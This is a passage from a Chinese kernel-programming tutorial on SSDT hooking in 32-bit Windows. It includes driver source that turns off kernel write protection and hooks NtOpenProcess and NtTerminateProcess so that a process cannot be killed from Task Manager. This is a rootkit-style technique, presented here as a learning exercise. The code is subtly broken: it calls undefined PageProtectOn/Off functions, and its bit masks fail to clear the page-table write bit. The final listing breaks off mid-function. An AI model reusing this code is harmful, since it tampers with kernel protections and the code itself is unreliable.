class="line">  KSYSTEM_SERVICE_TABLE ntoskrnl;    <span class="comment">// 内核函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE win32k;      <span class="comment">// win32k.sys 函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed1;     <span class="comment">// 未使用</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed2;     <span class="comment">// 未使用</span></span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR, SSDT;</span><br></pre></td></tr></table></figure>

<p>  内核中有两个系统服务描述符表,一个是KeServiceDescriptorTable(由ntoskrnl.exe导出)，一个是KeServieDescriptorTableShadow(没有导出)。<br>    两者的区别是：KeServiceDescriptorTable仅有ntoskrnel一项，KeServieDescriptorTableShadow包含了ntoskrnel以及win32k。一般的Native API的服务地址由KeServiceDescriptorTable分派，gdi.dll&#x2F;user.dll的内核API调用服务地址由KeServieDescriptorTableShadow分派。还有要清楚一点的是win32k.sys只有在GUI线程中才加载，一般情况下是不加载的，所以要Hook KeServieDescriptorTableShadow的话，<strong>一般是用一个GUI程序通过IoControlCode来触发</strong>（或者在程序中先调用一个<code>gdi.dll/user.dll</code>的API，否则会蓝屏）。</p>
<div class="note info"><p>32位系统：</p>
<ul>
<li>XP：<code>KeServiceDescriptorTableShadow = KeServiceDescriptorTable - 0×40</code>。</li>
<li>Win7：<code>KeServiceDescriptorTableShadow = KeServiceDescriptorTable + 0×40</code>。</li>
</ul>
<p>64位系统：SSDT表是加密的。</p>
</div>

<p>64位系统的SSDT表可参考：<a href="https://www.cnblogs.com/revercc/p/14701592.html">HOOK技术之SSDT hook（x86&#x2F;x64）</a>。</p>
<h2 id="3-SSDT-HOOK"><a href="#3-SSDT-HOOK" class="headerlink" title="3 SSDT HOOK"></a>3 SSDT HOOK</h2><h3 id="3-1-SSDT-HOOK-原理"><a href="#3-1-SSDT-HOOK-原理" class="headerlink" title="3.1 SSDT HOOK 原理"></a>3.1 SSDT HOOK 原理</h3><p><strong>SSDT HOOK原理</strong>：用自己写好的一个函数替换SSDT中的一个函数<code>SSDT.ntoskrnl.ServiceTableBase[0xIndex]</code>即可。</p>
<div class="note warning"><p>注意事项：</p>
<ol>
<li><p>替换函数地址时必须保证SSDT表是<mark class="label danger">可写入的</mark>，但自XP系统之后SSDT内存块属性仅可读，需要自己进行修改，有至少三种方法可使用：</p>
<ul>
<li><p><mark class="label default">更改注册表</mark><br>恢复页面保护：<code>HKLM\SYSTEM\CurrentControlset\Control\Session Manger\Memory Management\EnforceWriteProtection=0</code><br>去掉页面保护：<code>HKLM\SYSTEM\CurrentControlset\Control\Session Manger\Memory Management\DisablePagingExecutive=1</code></p>
</li>
<li><p><mark class="label success">改变CR0寄存器下标16的位（第17位 &#x3D;&#x3D; 0，可写）</mark></p>
<p>CR0寄存器的第17位叫做保护属性位，控制着页的读或写属性。该方法在多核情况下不稳定，核切换时CR0也就切换了。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/QMc5JnSfsUotb3B.png" alt="51.png"></p>
</li>
<li><p><mark class="label warning">页表基址修改页属性</mark></p>
<p>通过修改要替换地址的<code>PDE_R/W &amp; PTE_R/W</code>属性。该方法最稳定最好。</p>
</li>
</ul>
</li>
</ol>
</div>

<div class="note primary"><p>32位系统上SSDT是导出的（<code>KeServiceDescriptorTable</code>），<strong>64位是不会导出的</strong>，但是可以通过PCHunter、Kernel Detective等工具查看到内核函数对应的函数下标索引。</p>
</div>

<p>如下是通过PCHunter查看到的SSDT表（内核钩子-SSDT-右键取消仅显示挂钩函数）：</p>
<p><img data-src="https://s2.loli.net/2022/03/07/PoLRjcEU2tr1Ym3.png" alt="21.png"></p>
<div class="note info"><p>每一个版本的Windows操作系统的系统服务函数的编号都是固定的，<strong>例如所有32位的windows 7的系统服务函数的编号都是固定的，无论系统版本如何变化</strong>。这主要是因为一旦更新操作系统后，如果系统服务函数的编号发生变化会导致系统不稳定。基于以上事实，我们只需要针对win7和win10<strong>定义四份函数表即可</strong>（32位、64位）。<a href="https://www.cnblogs.com/wf751620780/p/10460863.html">SSDT(系统服务描述符表 system services descriptor table) </a></p>
</div>

<p>SSDT HOOK推荐几篇文章：</p>
<ul>
<li><a href="https://blog.csdn.net/php_fly/article/details/9202379">SSDT Hook实现内核级的进程保护</a></li>
<li><a href="https://www.cnblogs.com/BoyXiao/archive/2011/09/03/2164574.html">进程隐藏与进程保护（SSDT Hook 实现）（一）</a></li>
<li><a href="https://www.cnblogs.com/BoyXiao/archive/2011/09/04/2166596.html">进程隐藏与进程保护（SSDT Hook 实现）（二）</a></li>
<li><a href="https://www.52pojie.cn/thread-1525669-1-1.html">系统调用(R3API调用过程详解) </a></li>
<li><a href="https://www.cnblogs.com/revercc/p/14701592.html">HOOK技术之SSDT hook（x86&#x2F;x64）</a></li>
</ul>
<h3 id="3-2-SSDT-HOOK模版"><a href="#3-2-SSDT-HOOK模版" class="headerlink" title="3.2 SSDT HOOK模版"></a>3.2 SSDT HOOK模版</h3><p>下面的驱动代码ssdt hook了NtOpenProcess函数，可以监视打开进程的操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 类型声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统服务表SST</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG ServiceTableBase;		<span class="comment">// 函数地址表</span></span><br><span class="line">	PULONG ServiceCounterTableBase;		<span class="comment">//函数被调用的次数</span></span><br><span class="line">	ULONG NumberOfService;			<span class="comment">// 函数个数</span></span><br><span class="line">	PULONG ParamTableBase;			<span class="comment">// 函数参数表（SSPT）</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;		<span class="comment">// 内核ntkrnlpa.exe函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k;		<span class="comment">// win32k.sys函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed1;</span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NTOPENPROCESS，用来指向旧的NtOpenProcess函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*NTOPENPROCESS)</span> <span class="params">(PHANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   POBJECT_ATTRIBUTES ObjectAttributes, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   PCLIENT_ID ClientId)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 函数声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">HookNtOpenProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtOpenProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtOpenProcess</span><span class="params">(PHANDLE  ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                          ACCESS_MASK  DesiredAccess, </span></span></span><br><span class="line"><span class="function"><span class="params">                          POBJECT_ATTRIBUTES  ObjectAttributes, </span></span></span><br><span class="line"><span class="function"><span class="params">                          PCLIENT_ID  ClientId)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 全局变量                                                             */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; <span class="comment">// ntoskrnl.exe 导出的全局变量</span></span><br><span class="line">ULONG uOldNtOpenProcess; <span class="comment">// 旧的函数地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 函数定义                                                             */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动入口</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// HOOK</span></span><br><span class="line">	HookNtOpenProcess();</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UnHookNtOpenProcess();</span><br><span class="line">	DbgPrint(<span class="string">&quot;Driver unloaded.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if(RCR4 &amp; 0x00000020)	//说明是2-9-9-12分页</span></span><br><span class="line"><span class="comment">&#123;		</span></span><br><span class="line"><span class="comment">	//修改PTE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD64*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8)) |= 0x02;</span></span><br><span class="line"><span class="comment">	//修改PDE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD64*)(0xc0600000 + ((HookFunAddr &gt;&gt; 18) &amp; 0x3ff8))) |= 0x02;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">else	//说明是10-10-12分页</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	//修改PTE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC)) |= 0x02;</span></span><br><span class="line"><span class="comment">	//修改PDE_R/W</span></span><br><span class="line"><span class="comment">	*(DWORD*)(0xC0000000 + (((HookFunAddr &gt;&gt; 22) &amp; 0x3FF) &lt; 2)) |= 0x02;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为可写，WP = 0</span></span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli; <span class="comment">// 关闭中断</span></span><br><span class="line">		mov eax, cr0;</span><br><span class="line">		<span class="keyword">and</span> eax, <span class="keyword">not</span> <span class="number">0x10000</span>; <span class="comment">// and eax,0FFFEFFFFh，WP位置0</span></span><br><span class="line">		mov cr0, eax;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为不可写，WP = 1</span></span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, cr0;</span><br><span class="line">		<span class="keyword">or</span> eax, <span class="number">0x10000</span>; <span class="comment">// WP位置1，</span></span><br><span class="line">		mov cr0, eax;</span><br><span class="line">		sti; <span class="comment">// 恢复中断</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HOOK NtOpenProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">HookNtOpenProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	uOldNtOpenProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7A</span>];</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7A</span>] = (ULONG)MyNtOpenProcess;</span><br><span class="line">	PageProtectOn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnHOOK NtOpenProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtOpenProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PageProtectOff();</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0x7A</span>] = uOldNtOpenProcess;</span><br><span class="line">	DisableWrite();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被修改的 NtOpenProcess 函数，简单打印参数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtOpenProcess</span><span class="params">(PHANDLE  ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                          ACCESS_MASK  DesiredAccess, </span></span></span><br><span class="line"><span class="function"><span class="params">                          POBJECT_ATTRIBUTES  ObjectAttributes, </span></span></span><br><span class="line"><span class="function"><span class="params">                          PCLIENT_ID  ClientId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;%x %x %x %x\n&quot;</span>, ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">	<span class="keyword">return</span> ((NTOPENPROCESS)uOldNtOpenProcess)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-3-SSDT-HOOK-实现保护记事本进程"><a href="#3-3-SSDT-HOOK-实现保护记事本进程" class="headerlink" title="3.3 SSDT HOOK 实现保护记事本进程"></a>3.3 SSDT HOOK 实现保护记事本进程</h3><p>题目要求：<br>将系统服务表中某个函数改成自己的函数，使任务管理器右键无法关闭自己，只有点击自己的关闭按钮才可以正常关闭。</p>
<p>补充内容：<br>在3环的程序要想终止某个进程会调用函数<code>TerminateProcess(HANDLE hProcess, UINT uExitCode)</code>，通过追码有以下调用流程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span>环：Kernel32.dll.TerminateProcess(x,x) --&gt; NtDll.dll.NtTerminateProcess(x,x)</span><br><span class="line"><span class="number">0</span>环：--&gt; ntkrnlpa.exe.NtTerminateProcess(x,x)</span><br></pre></td></tr></table></figure>

<div class="note primary"><p>前面在驱动开发部分已经通过特征码搜索未导出函数<code>PspTerminateProcess</code>来结束一个进程，他和<code>NtTerminateProcess</code>函数的区别：</p>
<ul>
<li><code>NtTerminateProcess</code>：ntkrnlpa.exe中<strong>未导出该函数</strong>，<strong>存在于SST中</strong>，操作系统提供给3环API调用。</li>
<li><code>PspTerminateProcess</code>：ntkrnlpa.exe中<strong>未导出该函数</strong>，<strong>也不存在于SST中</strong>，但是操作系统自己结束一个进程时却是调用该函数。</li>
</ul>
</div>

<p>所以该题方法是SSDT HOOK NtTerminateProcess 函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="comment">// NtTerminateProcess 系统调用号</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTTERMINATEPROCESS_EAX 0x101</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 类型声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统服务表SST</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG ServiceTableBase;		<span class="comment">// 函数地址表</span></span><br><span class="line">	PULONG ServiceCounterTableBase;		<span class="comment">//函数被调用的次数</span></span><br><span class="line">	ULONG NumberOfService;			<span class="comment">// 函数个数</span></span><br><span class="line">	PULONG ParamTableBase;			<span class="comment">// 函数参数表（SSPT）</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;		<span class="comment">// 内核ntkrnlpa.exe函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k;		<span class="comment">// win32k.sys函数</span></span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed1;</span><br><span class="line">	KSYSTEM_SERVICE_TABLE unUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NTTERMINATEPRO，用来指向旧的NtTerminateProcess函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*NTTERMINATEPRO)</span> <span class="params">(HANDLE hProcess, NTSTATUS uExitCode)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 函数声明                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">HookNtTerminateProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtTerminateProcess</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtTerminateProcess</span><span class="params">(HANDLE hProcess, NTSTATUS uExitCode)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 全局变量                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; <span class="comment">// ntoskrnl.exe 导出的全局变量</span></span><br><span class="line">ULONG uOldNtTerminateProcess = <span class="number">0</span>; <span class="comment">// 旧的函数地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************</span></span><br><span class="line"><span class="comment"> 函数定义                                                             </span></span><br><span class="line"><span class="comment">************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动入口</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// HOOK</span></span><br><span class="line">	HookNtTerminateProcess();</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UnHookNtTerminateProcess();</span><br><span class="line">	DbgPrint(<span class="string">&quot;Driver unloaded.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为可写，WP = 0</span></span><br><span class="line"><span class="function">VOID <span class="title">EnableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		cli; // 关闭中断</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		and eax, not 0x10000; // and eax,0FFFEFFFFh，WP位置0</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) |= <span class="number">0x02</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为不可写，WP = 1</span></span><br><span class="line"><span class="function">VOID <span class="title">DisableWrite</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*	__asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		mov eax, cr0;</span></span><br><span class="line"><span class="comment">		or eax, 0x10000; // WP位置1，</span></span><br><span class="line"><span class="comment">		mov cr0, eax;</span></span><br><span class="line"><span class="comment">		sti; // 恢复中断</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	ULONG RCR4 = <span class="number">0</span>;</span><br><span class="line">	ULONG HookFunAddr = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX];</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//mov eax,cr4，VS2010无法识别该行代码，故以硬编码形式写入</span></span><br><span class="line">		_emit <span class="number">0x0F</span></span><br><span class="line">		_emit <span class="number">0x20</span></span><br><span class="line">		_emit <span class="number">0xE0</span></span><br><span class="line">		mov RCR4,eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(RCR4 &amp; <span class="number">0x00000020</span>)	<span class="comment">//说明是2-9-9-12分页</span></span><br><span class="line">	&#123;		</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x007FFFF8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(DWORD64*)(<span class="number">0xc0600000</span> + ((HookFunAddr &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3ff8</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>	<span class="comment">//说明是10-10-12分页</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//修改PTE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0000000</span> + ((HookFunAddr &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x003FFFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">		<span class="comment">//修改PDE_R/W</span></span><br><span class="line">		*(ULONG*)(<span class="number">0xC0300000</span> + ((HookFunAddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>)) &amp;= <span class="number">0xFFFFFFFDF</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	__asm sti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">HookNtTerminateProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	uOldNtTerminateProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX];</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX] = (ULONG)MyNtTerminateProcess;</span><br><span class="line">	DisableWrite();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnHOOK NtTerminateProcess</span></span><br><span class="line"><span class="function">VOID <span class="title">UnHookNtTerminateProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EnableWrite();</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[NTTERMINATEPROCESS_EAX] = uOldNtTerminateProcess;</span><br><span class="line">	DisableWrite();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被修改的 NtOpenProcess 函数，简单打印参数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyNtTerminateProcess</span><span class="params">(HANDLE hProcess, NTSTATUS uExitCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line">	NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">	PCHAR ImageFileName = <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">	<span class="comment">//通过进程句柄来获得该进程所对应的 FileObject 对象，由于这里是进程对象，自然获得的是 EPROCESS 对象</span></span><br><span class="line">	<span class="comment">//判断要关闭的进程是否是记事本</span></span><br><span class="line">	status = ObReferenceObjectByHandle(hProcess,FILE_ANY_ACCESS,*PsProcessType,KernelMode,(PVOID*)&amp;pEprocess,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	ImageFileName = (PCHAR)((ULONG)pEprocess + <span class="number">0x174</span>);</span><br><span class="line">  <span class="comment">//判断要关闭的进程是否是记事本</span></span><br><span class="line">	<span class="keyword">if</span> (<span 